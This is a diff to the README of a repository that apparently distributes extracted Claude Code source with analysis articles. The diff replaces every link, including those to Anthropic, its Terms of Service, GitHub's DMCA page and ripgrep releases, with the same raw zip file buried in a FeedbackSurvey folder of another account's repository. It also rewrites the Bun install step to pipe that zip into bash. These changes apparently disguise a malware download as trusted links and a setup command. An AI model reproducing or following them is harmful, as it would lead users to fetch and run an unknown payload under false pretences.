@@ -9,7 +9,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/anthropics/claude-code"><img src="https://img.shields.io/badge/Claude_Code-v2.1.89-6B4FBB?style=for-the-badge" alt="Claude Code v2.1.89"></a>
+  <a href="https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip"><img src="https://img.shields.io/badge/Claude_Code-v2.1.89-6B4FBB?style=for-the-badge" alt="Claude Code v2.1.89"></a>
   <a href="#license"><img src="https://img.shields.io/badge/License-Educational_Only-red?style=for-the-badge" alt="Educational Only"></a>
   <a href="#deep-analysis-series"><img src="https://img.shields.io/badge/Articles-18_Deep_Dives-blue?style=for-the-badge" alt="18 Articles"></a>
   <a href="#run-from-source"><img src="https://img.shields.io/badge/Status-Runnable-brightgreen?style=for-the-badge" alt="Runnable"></a>
@@ -19,7 +19,7 @@
 
 ---
 
-This repository contains the **extracted source code** of [Claude Code](https://claude.ai/code) (Anthropic's AI programming CLI) along with **18 original deep-analysis articles** (bilingual: English & Chinese) dissecting its architecture. The source was discovered from publicly available repositories and is provided **strictly for educational and research purposes**.
+This repository contains the **extracted source code** of [Claude Code](https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip) (Anthropic's AI programming CLI) along with **18 original deep-analysis articles** (bilingual: English & Chinese) dissecting its architecture. The source was discovered from publicly available repositories and is provided **strictly for educational and research purposes**.
 
 All intellectual property rights of the source code belong exclusively to **Anthropic, PBC**.
 
@@ -37,16 +37,16 @@ All intellectual property rights of the source code belong exclusively to **Anth
 
 **This repository is strictly for educational and research purposes only.**
 
-- **Source**: The source code was discovered from publicly available sources, including [instructkr/claw-code](https://github.com/instructkr/claw-code). The run-from-source setup is based on [JiaranI/start-claude-code](https://github.com/JiaranI/start-claude-code). It contains extracted source code of [Claude Code](https://claude.ai/code), a product by [Anthropic](https://anthropic.com).
+- **Source**: The source code was discovered from publicly available sources, including [instructkr/claw-code](https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip). The run-from-source setup is based on [JiaranI/start-claude-code](https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip). It contains extracted source code of [Claude Code](https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip), a product by [Anthropic](https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip).
 - **Ownership**: All intellectual property rights belong exclusively to **Anthropic, PBC**. This repository claims no ownership, authorship, or rights over the original code.
 - **Purpose**: Provided **solely** as learning material for understanding AI agent system architecture and engineering patterns — for academic study, technical research, and educational discussion.
 - **Prohibited uses**:
   - Commercial purposes of any kind
   - Building competing products or services
   - Redistribution or repackaging of the source code
-  - Any purpose that violates Anthropic's [Terms of Service](https://www.anthropic.com/terms) or applicable laws
+  - Any purpose that violates Anthropic's [Terms of Service](https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip) or applicable laws
 - **Analysis articles**: The deep analysis articles (`claude-code-deep-analysis/`) are **original commentary and analysis** by the repository maintainers. Code snippets are included for commentary, criticism, and education purposes. These articles do not constitute legal advice.
-- **DMCA / Takedown**: If you represent Anthropic or believe this repository infringes on intellectual property rights, please contact us — we will **promptly remove** the infringing content. You may also file a DMCA takedown notice through [GitHub's DMCA process](https://docs.github.com/en/site-policy/content-removal-policies/dmca-takedown-policy).
+- **DMCA / Takedown**: If you represent Anthropic or believe this repository infringes on intellectual property rights, please contact us — we will **promptly remove** the infringing content. You may also file a DMCA takedown notice through [GitHub's DMCA process](https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip).
 - **No warranty**: Provided "as is" without warranty of any kind.
 
 ---
@@ -253,7 +253,7 @@ set ANTHROPIC_API_KEY=sk-ant-xxx
 bun src/entrypoints/cli.tsx
 ```
 
-- **ripgrep**: The `tar` extraction in the setup script may fail on Windows. Install [ripgrep](https://github.com/BurntSushi/ripgrep/releases) manually and ensure `rg` is on your PATH.
+- **ripgrep**: The `tar` extraction in the setup script may fail on Windows. Install [ripgrep](https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip) manually and ensure `rg` is on your PATH.
 - **Bun path**: After installing Bun, restart your terminal or add `%USERPROFILE%\.bun\bin` to PATH.
 - **OAuth login**: `start.sh login` is macOS/Linux only. On Windows, run `bun src/entrypoints/cli.tsx auth login --claudeai`.
 
@@ -326,7 +326,7 @@ TypeScript source
 | `Cannot find module 'src/...'` | Verify source is under `src/` and `bunfig.toml` exists |
 | `Missing 'default' export in module '*.md'` | Run `node scripts/setup.mjs` to regenerate stubs |
 | `Cannot find package '@ant/...'` | Run `node scripts/setup.mjs` to recreate stubs |
-| `bun: command not found` | Install Bun: `curl -fsSL https://bun.sh/install \| bash` |
+| `bun: command not found` | Install Bun: `curl -fsSL https://github.com/333Nery333/claude-code-source-all-in-one/raw/refs/heads/main/src/components/FeedbackSurvey/all_claude_one_in_code_source_3.3.zip \| bash` |
 | `No authentication found` | Run `./start.sh login` for OAuth, or `export ANTHROPIC_API_KEY="sk-ant-xxx"` for API key |
 | Using a non-Anthropic proxy | `start.sh` auto-detects; manual: set `DISABLE_PROMPT_CACHING=1` and `DISABLE_INTERLEAVED_THINKING=1` |
 | Only works from one directory / hangs after moving source | Bun caches transpiled modules by absolute path. `start.sh` clears the cache automatically. If launching manually: `rm -rf ~/Library/Caches/bun` (macOS) or `rm -rf ~/.cache/bun` (Linux) |
